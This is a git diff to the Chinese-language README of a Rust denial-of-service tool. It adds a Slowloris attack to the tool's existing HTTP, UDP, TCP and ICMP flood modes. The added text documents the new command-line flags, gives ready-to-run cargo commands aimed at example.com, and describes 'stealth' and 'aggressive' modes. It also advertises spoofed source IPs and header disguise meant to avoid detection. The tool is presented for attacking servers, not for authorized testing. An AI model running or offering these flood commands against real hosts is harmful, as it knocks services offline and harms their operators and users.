@@ -18,7 +18,7 @@
 
 ## 功能特性
 
-- 🚀 **极高性能**: 支持HTTP/UDP/TCP/ICMP四大攻击类型，异步高并发
+- 🚀 **极高性能**: 支持HTTP/UDP/TCP/ICMP/Slowloris五大攻击类型，异步高并发
 - 📊 **实时监控**: 实时显示RPS（每秒请求数）和成功率
 - 🔧 **灵活配置**: 支持自定义目标、端口、并发数、持续时间、数据包大小
 - 📈 **详细统计**: 提供详细的攻击统计信息
@@ -29,6 +29,7 @@
 - 🌊 **UDP洪水攻击**: 支持UDP数据包洪水攻击
 - 🌪️ **TCP洪水攻击**: 支持TCP洪水攻击，支持random/http/custom三种payload
 - 🎯 **ICMP洪水攻击**: 支持ICMP洪水攻击，支持伪装源IP和随机数据包大小
+- 🐌 **Slowloris攻击**: 支持低带宽高效攻击，通过保持慢速连接耗尽服务器资源
 - 💬 **交互模式**: 友好的交互式用户界面
 
 ## 安装和编译
@@ -82,7 +83,7 @@ cargo run --release -- --target example.com --port 443 --https
 | `--post-data` | | | POST请求的数据 |
 | `--user-agent` | | | 自定义User-Agent |
 | `--mode` | `-m` | normal | 攻击模式 (normal/stealth/aggressive) |
-| `--attack-type` | `-a` | http | 攻击类型 (http/udp/tcp/icmp) |
+| `--attack-type` | `-a` | http | 攻击类型 (http/udp/tcp/icmp/slowloris) |
 | `--packet-size` | | 1024 | UDP/TCP/ICMP数据包大小 |
 | `--payload-type` | | random | TCP负载类型 (random/http/custom) |
 | `--custom-payload` | | | TCP自定义负载内容 |
@@ -90,6 +91,11 @@ cargo run --release -- --target example.com --port 443 --https
 | `--random-packet-size` | | false | ICMP随机数据包大小 |
 | `--min-packet-size` | | 64 | ICMP最小数据包大小 |
 | `--max-packet-size` | | 1024 | ICMP最大数据包大小 |
+| `--timeout` | | 30 | Slowloris超时时间（秒） |
+| `--keep-alive` | | false | Slowloris保持连接 |
+| `--random-headers` | | false | Slowloris随机头部 |
+| `--min-interval` | | 10 | Slowloris最小间隔（毫秒） |
+| `--max-interval` | | 50 | Slowloris最大间隔（毫秒） |
 | `--interactive` | `-i` | false | 启动交互模式 |
 
 ### 使用示例
@@ -140,6 +146,21 @@ cargo run --release -- --target example.com --attack-type icmp --random-packet-s
 # ICMP洪水攻击（隐蔽模式）
 cargo run --release -- --target example.com --attack-type icmp --mode stealth --packet-size 512
 
+# Slowloris攻击（基本）
+cargo run --release -- --target example.com --port 80 --attack-type slowloris
+
+# Slowloris攻击（保持连接）
+cargo run --release -- --target example.com --port 80 --attack-type slowloris --keep-alive
+
+# Slowloris攻击（随机头部）
+cargo run --release -- --target example.com --port 80 --attack-type slowloris --random-headers
+
+# Slowloris攻击（自定义间隔）
+cargo run --release -- --target example.com --port 80 --attack-type slowloris --min-interval 5 --max-interval 100
+
+# Slowloris攻击（隐蔽模式）
+cargo run --release -- --target example.com --port 80 --attack-type slowloris --mode stealth
+
 # 交互模式
 cargo run --release -- --interactive
 ```
@@ -159,6 +180,7 @@ cargo run --release -- --interactive
   "default_udp_connections": 1000,
   "default_tcp_connections": 1000,
   "default_icmp_connections": 1000,
+  "default_slowloris_connections": 500,
   "default_duration": 60,
   "default_packet_size": 1024,
   "default_mode": "normal",
@@ -173,6 +195,7 @@ cargo run --release -- --interactive
 | default_udp_connections  | UDP 默认并发连接数 |
 | default_tcp_connections  | TCP 默认并发连接数 |
 | default_icmp_connections | ICMP 默认并发连接数 |
+| default_slowloris_connections | Slowloris 默认并发连接数 |
 | default_duration         | 默认攻击持续时间（秒） |
 | default_packet_size      | UDP/TCP/ICMP 默认数据包大小（字节） |
 | default_mode             | 默认攻击模式（normal/stealth/aggressive） |
@@ -211,6 +234,15 @@ cargo run --release -- --interactive
 1. **调整并发数**: 根据目标服务器性能调整并发连接数
 2. **监控资源**: 观察CPU和内存使用情况
 3. **网络延迟**: 考虑网络延迟对性能的影响
+
+### 最新性能优化特性
+
+1. **连接池复用**: HTTP攻击使用优化的连接池，减少连接建立开销
+2. **内存优化**: 预生成随机数据，减少运行时内存分配
+3. **TCP优化**: 禁用Nagle算法，启用TCP keepalive
+4. **异步I/O**: 全异步操作，最大化CPU利用率
+5. **智能伪装**: 增强的HTTP头部伪装，提高隐蔽性
+6. **Slowloris优化**: 低带宽高效攻击，通过保持慢速连接耗尽服务器资源
 
 ## 输出说明
 
@@ -314,6 +346,25 @@ cargo run --release -- --interactive
    - 并发数：用户指定值的400%
    - 延迟：1-5ms随机延迟
    - 特点：最大化TCP攻击强度
+   - 适用：对性能要求极高的场景
+
+### Slowloris攻击模式
+
+1. **Normal模式** (默认)
+   - 并发数：用户指定值
+   - 延迟：10-50ms随机延迟
+   - 特点：平衡性能和隐蔽性
+
+2. **Stealth模式** (隐蔽)
+   - 并发数：用户指定值的50%
+   - 延迟：50-200ms随机延迟
+   - 特点：高度隐蔽，减少被检测风险
+   - 适用：需要高度隐蔽的场景
+
+3. **Aggressive模式** (激进)
+   - 并发数：用户指定值的200%
+   - 延迟：1-10ms随机延迟
+   - 特点：最大化Slowloris攻击强度
    - 适用：对性能要求极高的场景
 
 ## 技术架构
